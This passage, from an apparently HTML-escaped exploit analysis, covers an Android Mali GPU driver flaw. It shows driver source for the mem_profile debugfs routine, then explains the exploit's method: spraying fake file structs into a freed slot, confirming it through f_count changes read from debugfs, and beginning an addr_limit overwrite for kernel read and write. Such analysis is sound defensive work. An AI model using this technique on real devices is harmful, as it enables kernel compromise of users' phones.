class=\"vdnyYxSRCi-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;dev&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c18\"&gt;&amp;quot;initialised: %d&amp;quot;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; kbase_ctx_flag&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;kctx&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;KCTX_MEM_PROFILE_INITIALIZED&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;));&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;if&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(!&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;kbase_ctx_flag&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;kctx&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;KCTX_MEM_PROFILE_INITIALIZED&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;))&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;if&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;IS_ERR_OR_NULL&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;kctx&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;kctx_dentry&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;))&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; err &amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;ENOMEM&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;}&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;else&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;if&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(!&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;debugfs_create_file&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c18\"&gt;&amp;quot;mem_profile&amp;quot;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;0444&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; kctx&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;kctx_dentry&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;kctx&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;kbasep_mem_profile_debugfs_fops&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;))&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; err &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;EAGAIN&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;}&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;else&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; kbase_ctx_flag_set&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;kctx&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;KCTX_MEM_PROFILE_INITIALIZED&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;if&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;kbase_ctx_flag&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;kctx&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;KCTX_MEM_PROFILE_INITIALIZED&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;))&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; kfree&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;kctx&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;mem_profile_data&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; kctx&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;mem_profile_data &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;data&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; kctx&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;mem_profile_size &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;size&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;}&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;else&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; kfree&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;data&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; dev_dbg&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;kctx&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;kbdev&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;dev&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c18\"&gt;&amp;quot;returning: %d, initialised: %d&amp;quot;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; err&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;kbase_ctx_flag&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;kctx&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;KCTX_MEM_PROFILE_INITIALIZED&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;));&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mutex_unlock&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;kctx&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;mem_profile_lock&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;return&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;err&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c20\"&gt;#else&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c20\"&gt;/* CONFIG_DEBUG_FS */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;int&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;kbasep_mem_profile_debugfs_insert&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;struct&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;kbase_context &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;*&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;kctx&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;char&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;*&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;data&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; size_t size&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; kfree&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;data&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;return&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;0&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c20\"&gt;#endif&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c20\"&gt;/* CONFIG_DEBUG_FS */&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;By writing the fake file structs as a singular 0x2000 size buffer rather than as 25 individual 0x140 size buffers, the exploit will be writing their fake structs to two whole pages which increases the odds of reallocating over the freed file struct.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;The exploit then calls &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;dup2&lt;/span&gt;&lt;span&gt;&amp;nbsp;on the dangling FD&amp;rsquo;s. The &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;dup2&lt;/span&gt;&lt;span&gt;&amp;nbsp;syscall will open another fd on the same open file structure that the original points to. In this case, the exploit is calling &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;dup2&lt;/span&gt;&lt;span&gt;&amp;nbsp;to verify that they successfully reallocated a fake file structure in the same place as the freed file structure. &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;dup2&lt;/span&gt;&lt;span&gt;&amp;nbsp;will increment the reference count (&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;f_count&lt;/span&gt;&lt;span&gt;) in the file structure. In all of our fake file structures, the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;f_count&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&amp;nbsp;was set to 0x7F. So if any of them are incremented to 0x80, the exploit knows that it successfully reallocated over the freed file struct.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;To determine if any of the file struct&amp;rsquo;s refcounts were incremented, the exploit iterates through each of the directories under &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;/sys/kernel/debug/mali/mem/&lt;/span&gt;&lt;span&gt;&amp;nbsp;and reads each directory&amp;rsquo;s &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;mem_profile&lt;/span&gt;&lt;span&gt;&amp;nbsp;contents. If it finds the byte 0x80, then it knows that it successfully reallocated the freed struct and that the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;f_count&lt;/span&gt;&lt;span&gt;&amp;nbsp;of the fake file struct was incremented.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"vdnyYxSRCi-c17 vdnyYxSRCi-c8\" id=\"h.yfq0poarwpr9\"&gt;&lt;span&gt;Overwriting the addr_limit&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;Like many previous Android exploits, to gain arbitrary kernel read and write, the exploit overwrites the kernel address limit (&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;addr_limit&lt;/span&gt;&lt;span&gt;). The &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;addr_limit&lt;/span&gt;&lt;span&gt;&amp;nbsp;defines the address range that the kernel may access when dereferencing userspace pointers. For userspace threads, the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;addr_limit&lt;/span&gt;&lt;span&gt;&amp;nbsp;is usually &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;USER_DS&lt;/span&gt;&lt;span&gt;&amp;nbsp;or&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;0x7FFFFFFFFF&lt;/span&gt;&lt;span&gt;. For kernel threads, it&amp;rsquo;s usually &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;KERNEL_DS&lt;/span&gt;&lt;span&gt;&amp;nbsp;or &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;0xFFFFFFFF&lt;/span&gt;&lt;span 